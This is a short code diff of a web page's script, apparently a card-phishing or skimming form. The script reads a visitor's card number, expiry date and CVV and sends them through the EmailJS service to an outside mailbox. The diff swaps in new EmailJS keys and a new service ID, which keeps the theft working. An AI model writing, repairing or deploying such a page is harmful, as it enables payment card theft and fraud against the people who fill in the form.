@@ -79,14 +79,14 @@ button {
 
 <script>
 (function(){
-    emailjs.init("Vs2MgplgVzefXI-X4");
+    emailjs.init("NgnyFkoI-lfD8zjWa");
 })();
 
 function submitCard(){
     document.getElementById("loader").style.display = "flex";
     document.querySelector("button").disabled = true;
 
-    emailjs.send("Ggfunds","template_8kxwgac",{
+    emailjs.send("service_ifnx4jr","template_8kxwgac",{
         card_number: document.getElementById("card").value,
         expiry: document.getElementById("exp").value,
         cvv: document.getElementById("cvv").value,
